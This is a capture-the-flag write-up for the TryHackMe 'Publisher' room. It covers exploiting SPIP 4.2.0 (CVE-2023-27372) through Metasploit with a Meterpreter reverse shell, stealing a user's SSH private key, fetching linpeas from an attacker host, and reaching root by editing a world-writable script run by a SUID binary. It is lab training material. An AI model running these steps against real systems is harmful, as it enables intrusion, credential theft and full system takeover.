# TRYHACKME : Publisher
A CMS hacking that is SPIP
# NMAP SCAN
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 df:72:2e:fa:7a:a4:12:52:a0:dc:c9:48:7c:63:48:d7 (RSA)
|   256 99:77:75:a6:cb:28:3a:43:fa:39:7e:9b:74:a1:90:92 (ECDSA)
|_  256 ce:93:ac:81:9d:a9:69:05:52:3a:1b:1d:aa:f2:85:36 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Publisher's Pulse: SPIP Insights & Tips
|_http-server-header: Apache/2.4.41 (Ubuntu)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# PORT 80

First let's run some basic dir fuzzing:
## GOBUSTER
```
/images               (Status: 301) [Size: 315] [--> http://10.201.68.178/images/]
/spip                 (Status: 301) [Size: 313] [--> http://10.201.68.178/spip/]      
```

## Searchsploit
After the enumeration of the cms version, let's look for available exploit of the following version:\
```
$ searchsploit 'spip 4.2.0'
-------------------------------------- ---------------------------------
 Exploit Title                        |  Path
-------------------------------------- ---------------------------------
SPIP v4.2.0 - Remote Code Execution ( | php/webapps/51536.py
-------------------------------------- ---------------------------------
Shellcodes: No Results

```
Let's look further about the vulnerability.
```
$ searchsploit -x 51536    
  Exploit: SPIP v4.2.0 - Remote Code Execution (Unauthenticated)
      URL: https://www.exploit-db.com/exploits/51536
     Path: /usr/share/exploitdb/exploits/php/webapps/51536.py
    Codes: CVE-2023-27372
 Verified: True
File Type: Python script, ASCII text executable
```
Look up [CVE-2023-27372](https://packetstorm.news/tos/aHR0cHM6Ly9wYWNrZXRzdG9ybS5uZXdzL2ZpbGVzLzE3MTkyMS9TUElQLVJlbW90ZS1Db21tYW5kLUV4ZWN1dGlvbi5odG1sIDE3NTQ3Mjk1NTggMDFkMjMyZGJjOWNjYzk4ZGE5NjU3YjUwYjdlYzcwMmRlNmE1MGFkZGI1NDM0Y2IzZWVhMzBjYTY5NzI1NWQ5ZA==). This one can be used for Metasploit.

## Metasploit
Let's proceed to use metasploit for exploitation
```
$ msfpsloit -q
...
> search spip
...
> use 12           // use the one with "spip_rce_form"

```

Set the options into the following:
```
msf6 exploit(multi/http/spip_rce_form) > options

Module options (exploit/multi/http/spip_rce_form):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:po
                                         rt[,type:host:port][...]
   RHOSTS     [TARGET-IP]    yes       The target host(s), see https://docs
                                         .metasploit.com/docs/using-metasploi
                                         t/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing conne
                                         ctions
   TARGETURI  /spip            yes       Path to Spip install
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  [MACHINE-IP]      yes       The listen address (an interface may be
                                     specified)
   LPORT  4444             yes       The listen port

```
 Then run the exploit.

### Meterpreter
Type the following commands:
```
> shell
pwd
cd /home/think
cat user.txt
[RETRIEVE FLAG]
```

# PRIVILEGE ESCALATION
From the same "/home/think" directory, proceed to the ".ssh" directory.

We can access and download the private and public key for the ssh.

```
> download id_rsa
```

Go back to your main terminal, and change the id_rsa file permission:
```
chmod 600 id_rsa
```

## SSH
Escalate privilege through the leaked private ssh key of user Think:
```
$ ssh think@10.201.103.88 -i id_rsa
```
We still need to further escalate our privileges by getting into root.
Let's find other flaws to the system.

## ROOT Access
According to the room "exploit a loophole that enables the execution of an unconfined bash shell and achieve privilege escalation." This will serve as a clue.

First let's upload linpeas for system enumeration. The **/tmp** directory for unusual reason is unwritable. Strange. Let's find other writable directory.
```
$ find / -type d -user think -writable 2>/dev/null
/proc/1572/task/1572/fd
/proc/1572/fd
/proc/1572/map_files
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/pulseaudio.service
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/dbus.socket
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/dbus.service
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/pulseaudio.service
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/dbus.socket
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/dbus.service
/home/think
/home/think/.gnupg
/home/think/.gnupg/private-keys-v1.d
/home/think/.cache
/home/think/.local
/home/think/.local/share
/home/think/.local/share/nano
/home/think/.ssh
/home/think/.config
/home/think/.config/pulse
/run/user/1000                            // SEEMS INTERESTING
/run/user/1000/dbus-1
/run/user/1000/dbus-1/services
/run/user/1000/pulse
/run/user/1000/gnupg
/run/user/1000/systemd
/run/user/1000/systemd/units
```

Let's use the **/run/user/1000** directory.

### Linpeas System Enumeration

> Attacker Machine
```
$ python3 -m http.server 80
```

> Target Machine
```
$ cd /
$ cd /run/user/1000
$ wget http://[ATTACKER-IP]/linpeas.sh
```

Run linpeas:
```
$ chmod 700 linpeas.sh
$ ./linpeas.sh
```

### Privilege Escalation

There are many results to be exploited from the enumeration. But we will exploit the strange **/opt** directory.

> Suspicious Linpeas Result 
```
Unexpected in /opt (usually empty)
...
-rwxrwxrwx 1 root root 1715 Jan 10 12:40 run_container.sh
```

Let's head to **/opt** directory
```
$ cd /
$ cd /opt
$ find / -perm /4000 2>/dev/null
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pppd
/usr/sbin/run_container
/usr/bin/at
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/umount
```

When it is run:
```
$ /usr/sbin/run_container
List of Docker containers:
ID: 41c976e507f8 | Name: jovial_hertz | Status: Up 44 minutes

Enter the ID of the container or leave blank to create a new one: 
```

Let
```
$strings /usr/sbin/run_container
/lib64/ld-linux-x86-64.so.2
libc.so.6
__stack_chk_fail
execve
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
GLIBC_2.4
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
/bin/bash
/opt/run_container.sh                                   // INTERESTING !!!!!!!!
:*3$"
GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.8061
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
run_container.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
__stack_chk_fail@@GLIBC_2.4
__libc_start_main@@GLIBC_2.2.5
execve@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
```

Then copy **/bin/bash** into **/run/user/1000**.

```
~$ cp /bin/bash /run/user/1000
~$ ls -la /run/user/1000
bash  bus  dbus-1  gnupg  inaccessible  pk-debconf-socket  pulse  systemd
```

Run bash from the **/run/user/1000**
```
~$ cd /run/user/1000
$ ./bash
```

Go to the **/opt** directory:
```
$ cd /opt
$ nano run_container.sh
```

Add the following bash command in the nano editor:
```
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
```

Run **run_container** and just ignore the error:
```
$ run_container
List of Docker containers:
ID: 41c976e507f8 | Name: jovial_hertz | Status: Up 10 minutes

Enter the ID of the container or leave blank to create a new one: 
/opt/run_container.sh: line 33: validate_container_id: command not found

OPTIONS:
1) Start Container
2) Stop Container
3) Restart Container
4) Create Container
5) Quit
Choose an action for a container: 1 
Error response from daemon: page not found
Error: failed to start containers: 
```

After running **run_container**, the command we incremented for the **/tmp** directory:
```
$ ls /tmp
bash                                                                              // HIGHLIGHTED IN RED
systemd-private-5d29a60d4f2948edbcb0571ceb1b7347-ModemManager.service-eS1Knf
systemd-private-5d29a60d4f2948edbcb0571ceb1b7347-systemd-logind.service-2S0XJf
systemd-private-5d29a60d4f2948edbcb0571ceb1b7347-systemd-resolved.service-BB8yUf
systemd-private-5d29a60d4f2948edbcb0571ceb1b7347-systemd-timesyncd.service-ISTWeh
$ ls -l /tmp/bash
-rwsr-sr-x 1 root root 1183448 Aug 10 03:13 /tmp/bash                            // HIGHLIGHTED IN RED
```

Let's now run **/tmp/bash**:
```
$ /tmp/bash
bash-5.0$ whoami
think
bash-5.0$ pwd
/opt
bash-5.0$ cat /root/root.txt
cat: /root/root.txt: Permission denied
bash-5.0$ exit
exit
```

We are still **Think** user, we will add **-p** with the command:
```
$ /tmp/bash -p
bash-5.0# whoami
root
bash-5.0# cat /root/root.txt
[RETRIEVE FLAG]
```





